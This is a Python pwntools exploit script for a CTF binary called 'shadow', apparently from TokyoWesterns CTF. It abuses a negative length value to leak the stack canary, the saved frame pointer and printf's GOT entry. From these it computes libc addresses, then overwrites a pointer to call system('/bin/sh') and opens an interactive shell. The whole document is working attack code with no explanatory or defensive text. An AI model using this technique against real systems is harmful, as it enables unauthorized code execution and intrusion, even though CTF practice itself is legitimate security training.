from pwn import *
#context.log_level = "debug"

HOST = "localhost"
#HOST = "pwn2.chal.ctf.westerns.tokyo"
PORT = 4444
#PORT = 18294

s = remote(HOST, PORT)

elf = ELF("./shadow")
libc = ELF("./libc-2.27.so")
pause()

printf_got = elf.got["printf"]

printf_off = libc.symbols["printf"]
system_off = libc.symbols["system"]
binsh_off = list(libc.search("/bin/sh"))[0] 

def send(name, length, message):
  s.recv()
  s.send(name)
  s.recv()
  s.sendline(length)
  s.recv()
  s.send(message)

payload = "A"*33

send("n", "-1", payload)
s.recvuntil(payload)
canary = u32("\x00" + s.recv(3))

print "############################################"
print "[*] canary : " + hex(canary)

payload = "A"*44

send("n", "-1", payload)
s.recvuntil(payload)
ebp = u32(s.recv(4))

print "[*] ebp : " + hex(ebp)

payload = "A"*52
payload += p32(printf_got) # name_pointer
payload += p32(0x500) # name_len
payload += p32(0x5) # max_count

send("n", "-1", payload)
s.recvuntil("<")
real_printf = u32(s.recv(4))

real_base = real_printf - printf_off
real_system = real_base + system_off
real_binsh = real_base + binsh_off

print "[*] real_base : " + hex(real_base)
print "[*] real_printf : " + hex(real_printf)
print "[*] real_system : " + hex(real_system)
print "[*] real_binsh : " + hex(real_binsh)
print "############################################"

payload = "A"*32
payload += p32(canary)
payload += "A"*16
payload += p32(ebp-256) # name_pointer

send("n", "-1", payload)
s.recv()

payload = p32(real_system)
payload += "AAAA"
payload += p32(real_binsh)

s.send(payload)
s.recv()

s.interactive()